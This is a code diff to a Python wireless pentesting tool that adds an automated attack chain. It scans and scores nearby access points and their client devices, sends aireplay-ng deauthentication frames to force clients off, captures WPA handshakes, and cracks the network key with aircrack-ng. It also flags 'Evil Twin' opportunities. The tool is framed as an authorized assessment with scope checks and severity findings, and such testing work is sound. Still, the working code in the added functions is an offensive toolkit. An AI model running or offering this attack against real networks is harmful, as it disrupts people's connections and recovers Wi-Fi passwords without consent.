@@ -43,7 +43,7 @@ from html.parser import HTMLParser as _HTMLParser
 from itertools import permutations as _permutations
 from pathlib import Path
 
-VERSION = "1.4.0"
+VERSION = "1.5.0"
 
 
 def _clients_base() -> Path:
@@ -1033,6 +1033,445 @@ def scan_targets(
     return discovered
 
 
+# ── Wireless Intelligence helpers ─────────────────────────────────────────────
+
+
+def _parse_airodump_csv_full(csv_path: str) -> tuple[list[dict], list[dict]]:
+    """Parse a complete airodump-ng CSV into (ap_list, station_list).
+
+    AP fields:      bssid, channel, speed, encryption, cipher, auth,
+                    signal, beacons, ssid, clients, client_count,
+                    score, best_target, wps
+    Station fields: mac, signal, packets, bssid (of associated AP), probed
+    """
+    aps: list[dict]      = []
+    stations: list[dict] = []
+    in_stations          = False
+
+    def _int(v: str) -> int:
+        try:
+            return int(v)
+        except (ValueError, TypeError):
+            return 0
+
+    try:
+        with open(csv_path, encoding="utf-8", errors="replace") as fh:
+            lines = fh.read().splitlines()
+    except Exception:
+        return aps, stations
+
+    for raw in lines:
+        stripped = raw.strip()
+        if not stripped:
+            continue
+        low = stripped.lower()
+        if low.startswith("bssid"):
+            in_stations = False
+            continue
+        if low.startswith("station mac"):
+            in_stations = True
+            continue
+
+        parts = [p.strip() for p in stripped.split(",")]
+
+        if not in_stations:
+            if len(parts) < 14:
+                continue
+            bssid = parts[0]
+            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
+                continue
+            aps.append({
+                "bssid":        bssid,
+                "channel":      _int(parts[3]),
+                "speed":        _int(parts[4]),
+                "encryption":   parts[5],
+                "cipher":       parts[6],
+                "auth":         parts[7],
+                "signal":       _int(parts[8]),
+                "beacons":      _int(parts[9]),
+                "ssid":         parts[13],
+                "clients":      [],
+                "client_count": 0,
+                "score":        0.0,
+                "best_target":  False,
+                "wps":          False,
+            })
+        else:
+            if len(parts) < 6:
+                continue
+            mac = parts[0]
+            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
+                continue
+            stations.append({
+                "mac":     mac,
+                "signal":  _int(parts[3]),
+                "packets": _int(parts[4]),
+                "bssid":   parts[5],
+                "probed":  parts[6] if len(parts) > 6 else "",
+            })
+
+    return aps, stations
+
+
+def _score_ap(signal: int, client_count: int) -> float:
+    """Score an AP 0–100: 40 % signal strength, 60 % connected clients.
+
+    Signal is normalised from -90 dBm (worst) to -30 dBm (best).
+    Client score saturates at 4 clients (25 pts each).
+    APs with clients are strongly preferred because they yield handshakes.
+    """
+    sig_norm     = max(-90, min(-30, signal)) if signal < 0 else -90
+    sig_score    = (sig_norm + 90) * (100.0 / 60.0)
+    client_score = min(100.0, client_count * 25.0)
+    return round(sig_score * 0.4 + client_score * 0.6, 1)
+
+
+def phase_wireless_intel(
+    monitor_iface: str,
+    target_ssids:  list[str],
+    target_bssids: list[str],
+    output_dir:    Path,
+    scan_seconds:  int = 45,
+) -> tuple[dict | None, list[dict]]:
+    """Phase 0-I: Deep wireless intelligence.
+
+    Runs a dedicated airodump-ng scan with parallel WPS detection (wash).
+    For every AP broadcasting the target SSID(s):
+      - captures full metadata (encryption, cipher, auth, signal, beacons)
+      - identifies every connected client station
+      - scores each AP (signal + client count)
+      - selects the best target
+
+    Writes access_points.json to output_dir.
+    Returns (best_ap, all_enriched_aps).
+    """
+    status("p0_intel", "Phase 0-I: Wireless Intelligence", "running")
+    intel_dir = output_dir / "wireless_intel"
+    intel_dir.mkdir(parents=True, exist_ok=True)
+
+    if not shutil.which("airodump-ng"):
+        log("[0-I] airodump-ng not found — skipping wireless intelligence scan")
+        status("p0_intel", "Phase 0-I: Wireless Intelligence", "skipped",
+               "airodump-ng not installed")
+        return None, []
+
+    log(f"[0-I] Wireless intelligence scan ({scan_seconds}s, --write-interval 5)…")
+    if target_ssids:
+        log(f"[0-I] Targeting SSID(s): {', '.join(repr(s) for s in target_ssids)}")
+
+    # WPS detection runs in parallel
+    wps_bssids: set[str] = set()
+    wps_proc             = None
+    if shutil.which("wash"):
+        try:
+            wps_proc = _popen(["sudo", "wash", "-i", monitor_iface, "-C"],
+                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+    out_prefix = str(intel_dir / "intel_scan")
+    cmd = [
+        "sudo", "airodump-ng",
+        "--write", out_prefix,
+        "--output-format", "csv",
+        "--write-interval", "5",
+        "--band", "abg",
+    ]
+    if target_ssids and len(target_ssids) == 1:
+        cmd += ["--essid", target_ssids[0]]
+    if target_bssids and len(target_bssids) == 1:
+        cmd += ["--bssid", target_bssids[0]]
+    cmd.append(monitor_iface)
+
+    proc = None
+    try:
+        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(scan_seconds)
+    except Exception as exc:
+        log(f"[0-I] airodump-ng error: {exc}")
+    finally:
+        if proc is not None:
+            _kill_proc(proc)
+
+    # Harvest WPS results
+    if wps_proc is not None:
+        try:
+            remaining, _ = wps_proc.communicate(timeout=3)
+            for ln in remaining.decode("utf-8", errors="replace").splitlines():
+                m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', ln.strip())
+                if m:
+                    wps_bssids.add(m.group(1).upper())
+        except Exception:
+            _kill_proc(wps_proc)
+
+    csv_file = out_prefix + "-01.csv"
+    if not os.path.exists(csv_file):
+        log("[0-I] No scan data collected")
+        status("p0_intel", "Phase 0-I: Wireless Intelligence", "error",
+               "no data collected")
+        return None, []
+
+    aps, stations = _parse_airodump_csv_full(csv_file)
+
+    # Filter to configured target scope
+    target_bssids_up = {b.upper() for b in (target_bssids or [])}
+    filtered: list[dict] = []
+    for ap in aps:
+        ssid_ok  = (not target_ssids)     or (ap["ssid"] in target_ssids)
+        bssid_ok = (not target_bssids_up) or (ap["bssid"].upper() in target_bssids_up)
+        if ssid_ok and bssid_ok:
+            ap["wps"] = ap["bssid"].upper() in wps_bssids
+            filtered.append(ap)
+
+    if not filtered:
+        log("[0-I] No APs found matching target SSID(s)")
+        status("p0_intel", "Phase 0-I: Wireless Intelligence", "complete")
+        return None, []
+
+    # Assign client stations to their APs
+    bssid_index = {ap["bssid"].upper(): ap for ap in filtered}
+    for sta in stations:
+        ap_bssid = sta.get("bssid", "").upper()
+        if ap_bssid in bssid_index:
+            bssid_index[ap_bssid]["clients"].append({
+                "mac":     sta["mac"],
+                "signal":  sta["signal"],
+                "packets": sta["packets"],
+            })
+
+    # Score and rank APs
+    for ap in filtered:
+        ap["client_count"] = len(ap["clients"])
+        ap["score"]        = _score_ap(ap["signal"], ap["client_count"])
+    filtered.sort(key=lambda a: a["score"], reverse=True)
+    if filtered:
+        filtered[0]["best_target"] = True
+
+    # Emit finding for multi-AP scenario
+    ssid_label = target_ssids[0] if target_ssids else filtered[0]["ssid"]
+    if len(filtered) > 1:
+        finding(
+            title=f"Multiple APs Broadcasting SSID: {ssid_label}",
+            severity="INFO",
+            description=(
+                f"{len(filtered)} access points are broadcasting '{ssid_label}'. "
+                f"This may indicate a distributed enterprise network or an Evil Twin "
+                f"deployment opportunity."
+            ),
+            data={"ap_count": len(filtered),
+                  "bssids": [ap["bssid"] for ap in filtered]},
+        )
+
+    # Log results
+    total_clients = sum(ap["client_count"] for ap in filtered)
+    log(f"[0-I] Found {len(filtered)} AP(s), {total_clients} total client(s):")
+    for ap in filtered:
+        enc_str = " / ".join(
+            p for p in [ap["encryption"], ap["cipher"], ap["auth"]] if p.strip()
+        )
+        tag = "  ◄ BEST TARGET" if ap["best_target"] else ""
+        log(f"  {'★' if ap['best_target'] else '·'} {ap['ssid']!r} "
+            f"[{ap['bssid']}] ch={ap['channel']} "
+            f"sig={ap['signal']}dBm  enc={enc_str}  "
+            f"wps={ap['wps']}  clients={ap['client_count']}  "
+            f"score={ap['score']}{tag}")
+        for c in ap["clients"]:
+            log(f"      ↳ {c['mac']}  sig={c['signal']}dBm  pkts={c['packets']}")
+
+    # Persist to access_points.json (read by Spectre Access Points tab)
+    ap_json_path = output_dir / "access_points.json"
+    ap_json_path.write_text(json.dumps({
+        "scan_time":    datetime.now().isoformat(),
+        "target_ssids": target_ssids,
+        "access_points": filtered,
+    }, indent=2), encoding="utf-8")
+    log(f"[0-I] Wrote {ap_json_path}")
+
+    best = filtered[0]
+    status("p0_intel", "Phase 0-I: Wireless Intelligence", "complete",
+           f"{len(filtered)} AP(s) | best: {best['bssid']}")
+    return best, filtered
+
+
+def _deauth_clients(
+    monitor_iface: str,
+    bssid:         str,
+    channel:       int,
+    clients:       list[dict],
+    deauth_count:  int = 5,
+) -> None:
+    """Send deauthentication frames via aireplay-ng to force client re-association.
+
+    Sends targeted frames to each known client MAC; falls back to broadcast
+    deauth if no client list is available.
+    """
+    if not shutil.which("aireplay-ng"):
+        log("[1c] aireplay-ng not found — cannot send deauth frames")
+        return
+    if channel > 0:
+        _run(["sudo", "iwconfig", monitor_iface, "channel", str(channel)], timeout=5)
+    if clients:
+        for c in clients:
+            mac = c.get("mac", "")
+            if not mac:
+                continue
+            log(f"[1c] Deauth ×{deauth_count} → {mac} from {bssid}")
+            _run(["sudo", "aireplay-ng",
+                  "-0", str(deauth_count),
+                  "-a", bssid, "-c", mac,
+                  monitor_iface],
+                 timeout=deauth_count * 2 + 10)
+    else:
+        log(f"[1c] Broadcast deauth ×{deauth_count} → {bssid}")
+        _run(["sudo", "aireplay-ng",
+              "-0", str(deauth_count),
+              "-a", bssid,
+              monitor_iface],
+             timeout=deauth_count * 2 + 10)
+
+
+def phase_deauth_handshake(
+    monitor_iface: str,
+    enriched_aps:  list[dict],
+    output_dir:    Path,
+    wordlist:      str | None,
+    timeout:       int = 300,
+    deauth_count:  int = 5,
+) -> None:
+    """Phase 1c: Targeted deauth + dedicated handshake capture.
+
+    For each in-scope AP that has connected clients (best-scored first):
+      1. Start airodump-ng capture on the AP's specific BSSID + channel
+      2. Send targeted deauth frames to each connected client
+      3. Wait for airodump-ng to confirm WPA handshake capture
+      4. Attempt aircrack-ng dictionary crack if a wordlist is configured
+
+    Emits AETHER-002 only when handshake capture is confirmed by airodump-ng
+    stdout — never on error output alone.
+    """
+    if not shutil.which("airodump-ng"):
+        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
+               "airodump-ng not installed")
+        return
+    if not shutil.which("aireplay-ng"):
+        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
+               "aireplay-ng not installed")
+        return
+
+    aps_scoped = [ap for ap in enriched_aps if _in_scope(ap)]
+    aps_with_clients = [ap for ap in aps_scoped if ap.get("clients")]
+    if not aps_with_clients:
+        log("[1c] No connected clients discovered — cannot perform targeted deauth")
+        log("[1c] Tip: wait for clients or use Phase 1a (PMKID) for clientless capture")
+        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
+               "no clients discovered")
+        return
+
+    status("p1c_deauth", "Phase 1c: Deauth + Handshake", "running")
+    deauth_dir = output_dir / "deauth_handshake"
+    deauth_dir.mkdir(parents=True, exist_ok=True)
+
+    for ap in sorted(aps_with_clients, key=lambda a: a.get("score", 0), reverse=True):
+        ssid    = ap.get("ssid", "")
+        bssid   = ap["bssid"]
+        channel = ap.get("channel", 0)
+        clients = ap.get("clients", [])
+        safe    = re.sub(r'[^\w]', '_', ssid or bssid)
+        cap_prefix = str(deauth_dir / f"cap_{safe}")
+
+        log(f"[1c] Target: {ssid!r} [{bssid}] ch={channel} "
+            f"clients={len(clients)} score={ap.get('score', 0)}")
+
+        # Start dedicated capture on this BSSID + channel
+        cap_cmd = [
+            "sudo", "airodump-ng",
+            "-c", str(channel),
+            "--bssid", bssid,
+            "-w", cap_prefix,
+            "--output-format", "cap",
+            monitor_iface,
+        ]
+        cap_proc           = None
+        handshake_captured = False
+        try:
+            cap_proc = _popen(cap_cmd,
+                               stdout=subprocess.PIPE,
+                               stderr=subprocess.STDOUT)
+            time.sleep(3)  # let capture stabilise before deauth
+            _deauth_clients(monitor_iface, bssid, channel, clients, deauth_count)
+
+            # Monitor airodump output for handshake confirmation
+            deadline = time.time() + min(timeout, 90)
+            while time.time() < deadline:
+                if cap_proc.poll() is not None:
+                    break
+                if cap_proc.stdout:
+                    line = _readline_timed(cap_proc.stdout,
+                                           min(deadline, time.time() + 2))
+                    if line:
+                        decoded = line.decode("utf-8", errors="replace").rstrip()
+                        if decoded.strip():
+                            log(decoded)
+                        if re.search(r'WPA handshake', decoded, re.I):
+                            handshake_captured = True
+                            log(f"[1c] ✓ WPA handshake captured for {ssid!r}")
+                            break
+                else:
+                    time.sleep(2)
+        finally:
+            if cap_proc is not None:
+                _kill_proc(cap_proc)
+
+        cap_file = cap_prefix + "-01.cap"
+        if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
+            log(f"[1c] No capture data for {ssid!r}")
+            continue
+
+        if handshake_captured:
+            finding_from_cat(
+                "AETHER-002",
+                data={"ssid": ssid, "bssid": bssid, "attack": "deauth",
+                      "clients_deauthed": len(clients)},
+                output_file=cap_file,
+                title_override=f"WPA Handshake Captured via Deauth: {ssid}",
+            )
+
+        # Attempt dictionary crack with aircrack-ng
+        if wordlist and os.path.exists(wordlist) and shutil.which("aircrack-ng"):
+            log(f"[1c] Cracking {ssid!r} with aircrack-ng…")
+            crack_out, _ = _run([
+                "sudo", "aircrack-ng",
+                "-w", wordlist,
+                "-b", bssid,
+                cap_file,
+            ], timeout=min(timeout, 600))
+            (deauth_dir / f"aircrack_{safe}.txt").write_text(
+                crack_out, encoding="utf-8"
+            )
+            m_key = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', crack_out)
+            if m_key:
+                psk = m_key.group(1)
+                log(f"[1c] KEY FOUND for {ssid!r}: {psk}")
+                finding(
+                    title=f"WPA Pre-Shared Key Cracked via Deauth: {ssid}",
+                    severity="CRITICAL",
+                    description=(
+                        f"Deauthentication attack on '{ssid}' [{bssid}] forced "
+                        f"client re-association, capturing the WPA 4-way handshake. "
+                        f"The PSK was recovered via dictionary attack: '{psk}'."
+                    ),
+                    data={"ssid": ssid, "bssid": bssid, "psk": psk,
+                          "attack": "deauth+aircrack"},
+                    output_file=cap_file,
+                    cvss_score=9.0,
+                    cvss_vector="AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                )
+            elif not handshake_captured:
+                log(f"[1c] No confirmed handshake for {ssid!r} — nothing to crack")
+
+    status("p1c_deauth", "Phase 1c: Deauth + Handshake", "complete")
+
+
 # ── Phase 0: WEP IV capture + PTW cracking ───────────────────────────────────
 
 def phase_wep(
@@ -1351,7 +1790,7 @@ def phase_wifite(
         "--wpa",
         "--wps",
         "--pmkid",
-        "--interface", monitor_iface,
+        "-i", monitor_iface,
         "--timeout", str(min(timeout, 60)),
         "--crack-handshake",
     ]
@@ -1371,7 +1810,11 @@ def phase_wifite(
                         output_file=str(out_file),
                         title_override=title,
                     )
-            if re.search(r'handshake|PMKID|\.hc22000', line, re.I):
+            if re.search(
+                r'(?:WPA handshake:|saved.*\.cap|\.hc22000|PMKID captured'
+                r'|\[\+\].*(?:handshake|PMKID))',
+                line, re.I
+            ):
                 title = f"WPA Handshake / PMKID Captured: {ssid}"
                 if title not in seen:
                     seen.add(title)
@@ -1836,8 +2279,10 @@ def run(config: dict, project: str) -> None:
     scan_channel  = config.get("scan_channel")
     hashcat_rules = config.get("hashcat_rules", [])
     asleap_path   = config.get("asleap_path", "")
-    scrape_url    = (config.get("scrape_url") or "").strip()
-    scrape_depth  = int(config.get("scrape_depth", 4))
+    scrape_url         = (config.get("scrape_url") or "").strip()
+    scrape_depth       = int(config.get("scrape_depth", 4))
+    intel_scan_seconds = int(config.get("intel_scan_seconds", 45))
+    deauth_packets     = int(config.get("deauth_packets", 5))
 
     # Scope enforcement
     scope_cfg    = config.get("scope", {})
@@ -1877,8 +2322,24 @@ def run(config: dict, project: str) -> None:
     try:
         _check_injection(active_monitor)
 
+        # Phase 0-I: Wireless Intelligence — enumerate all APs broadcasting the
+        # target SSID, identify connected clients, score and select best target.
+        best_ap, enriched_aps = phase_wireless_intel(
+            active_monitor, target_ssids, target_bssids, output_dir,
+            scan_seconds=intel_scan_seconds,
+        )
+
+        # Narrow subsequent phases to the best-scored AP when user has not
+        # specified an explicit BSSID — reduces false-positive capture and
+        # avoids attacking out-of-scope BSSIDs.
+        effective_bssids = list(target_bssids)
+        if not effective_bssids and best_ap:
+            effective_bssids = [best_ap["bssid"]]
+            log(f"Best target selected: {best_ap.get('ssid','')!r} "
+                f"[{best_ap['bssid']}] score={best_ap['score']}")
+
         target_aps = scan_targets(
-            active_monitor, target_ssids, target_bssids,
+            active_monitor, target_ssids, effective_bssids,
             timeout=30, channel=scan_channel,
         )
 
@@ -1892,8 +2353,14 @@ def run(config: dict, project: str) -> None:
 
         if phases_cfg.get("wpa_handshake", True):
             phase_wifite(
-                active_monitor, target_ssids, target_bssids,
+                active_monitor, target_ssids, effective_bssids,
                 _effective_wl, output_dir, timeout,
+            )
+
+        if phases_cfg.get("deauth_handshake", True):
+            phase_deauth_handshake(
+                active_monitor, enriched_aps, output_dir,
+                _effective_wl, timeout, deauth_packets,
             )
 
         if phases_cfg.get("wpa_enterprise", False):
